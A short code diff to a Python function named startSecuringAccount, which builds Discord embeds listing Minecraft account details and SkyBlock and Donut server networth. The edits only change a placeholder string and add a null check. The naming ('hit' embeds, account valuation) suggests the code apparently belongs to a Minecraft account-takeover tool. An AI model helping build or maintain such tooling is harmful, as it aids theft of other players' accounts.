@@ -33,7 +33,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
             "birthday": "Failed to Get"
         },
         "minecraft": {
-            "name": "Could not find",
+            "name": "No Minecraft",
             "method": "Not purchased",
             "gamertag": "Not Found",
             "uchange": "0 Days",
@@ -76,7 +76,7 @@ async def startSecuringAccount(session: httpx.AsyncClient, email: str, device: s
     stats_embed.add_field(name="Gifted", value=f'{hstats["gifted"]}', inline=True)
     stats_embed.add_field(name="SB NW", value=f'${simplify(hstats["networth"])}', inline=True)
     stats_embed.add_field(name="SB LVL", value=f'{simplify(hstats["slevel"])}', inline=True)
-    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats != "Failed" else 0}', inline=True)
+    stats_embed.add_field(name="Donut NW", value=f'{simplify(dstats["result"]["money"]) if dstats and dstats != "Failed" else 0}', inline=True)
 
     # Account Embed
     hit_embed = Embed(
